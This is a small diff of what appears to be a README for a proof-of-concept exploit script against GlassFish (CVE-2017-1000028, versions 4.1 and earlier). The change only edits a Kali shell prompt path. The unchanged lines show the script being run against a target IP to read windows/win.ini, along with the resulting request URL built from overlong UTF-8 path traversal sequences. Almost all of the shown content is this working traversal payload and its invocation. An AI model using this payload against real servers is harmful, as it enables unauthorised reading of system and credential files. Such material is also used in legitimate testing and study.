@@ -5,7 +5,7 @@
 - Version affected:  4.1 and prior versions
 
 ```python
-┌──(kali⚡lof1)-[~/Documents/PG/Fish]
+┌──(kali⚡lof1)-[~/Documents/PG]
 └─$ python3 GlassFish_CVE-2017-1000028.py --ip 192.168.240.168 --path windows/win.ini
 
 Requested URL: http://192.168.240.168:4848/theme/META-INF/prototype%C0%AF..%C0%AF..%C0%AF..%C0%AF..%C0%AF..%C0%AF..%C0%AF..%C0%AF..%C0%AF..%C0%AF..%C0%AF..%C0%AF..%C0%AFwindows/win.ini
